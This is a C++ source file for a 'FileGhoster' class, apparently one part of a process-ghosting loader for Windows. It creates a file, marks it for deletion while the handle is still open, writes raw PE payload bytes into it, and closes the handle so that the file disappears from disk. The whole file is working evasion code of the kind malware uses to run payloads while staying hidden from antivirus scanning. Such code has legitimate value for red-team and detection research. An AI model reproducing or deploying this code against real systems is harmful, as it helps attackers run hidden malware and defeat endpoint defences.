#include "FileGhoster.hpp"
#include <iostream>

/**
 * Creates a file on disk and marks it for deletion.
 * Because the handle remains open, the file exists in a "pending deletion" state.
 * It will be removed from the directory as soon as the last handle is closed.
 */
HANDLE FileGhoster::CreateGhostFile(const std::wstring &filePath)
{
    // 1. Create the file
    // We need GENERIC_WRITE to write the payload and GENERIC_READ for the section creation later
    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] Failed to create ghost file. Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // 2. Mark the file for deletion
    // FILE_DISPOSITION_INFO_EX is used to mark the file for deletion without
    // immediately removing it, provided the handle stays open.
    FILE_DISPOSITION_INFO_EX dispositionInfo;
    dispositionInfo.Flags = FILE_DISPOSITION_FLAG_DELETE;

    BOOL success = SetFileInformationByHandle(
        hFile,
        FileDispositionInfoEx,
        &dispositionInfo,
        sizeof(dispositionInfo));

    if (!success)
    {
        std::cerr << "[-] Failed to mark file for deletion. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return INVALID_HANDLE_VALUE;
    }

    std::cout << "[+] Ghost file created and marked for deletion: " << std::endl;
    return hFile;
}

/**
 * Writes the raw PE bytes into the ghost file.
 */
bool FileGhoster::WritePayloadToFile(HANDLE fileHandle, const std::vector<uint8_t> &payload)
{
    if (fileHandle == INVALID_HANDLE_VALUE || payload.empty())
    {
        return false;
    }

    DWORD bytesWritten = 0;
    BOOL success = WriteFile(
        fileHandle,
        payload.data(),
        static_cast<DWORD>(payload.size()),
        &bytesWritten,
        NULL);

    if (!success || bytesWritten != payload.size())
    {
        std::cerr << "[-] Failed to write payload to ghost file. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "[+] Payload successfully written to ghost file." << std::endl;
    return true;
}

/**
 * Closes the handle. Since the file was marked for deletion in CreateGhostFile,
 * closing the last handle now triggers the OS to remove the file from the disk.
 */
void FileGhoster::CloseGhostFile(HANDLE &fileHandle)
{
    if (fileHandle != INVALID_HANDLE_VALUE)
    {
        if (CloseHandle(fileHandle))
        {
            std::cout << "[+] Ghost file handle closed. File has been deleted from disk." << std::endl;
            fileHandle = INVALID_HANDLE_VALUE;
        }
        else
        {
            std::cerr << "[-] Failed to close ghost file handle. Error: " << GetLastError() << std::endl;
        }
    }
}
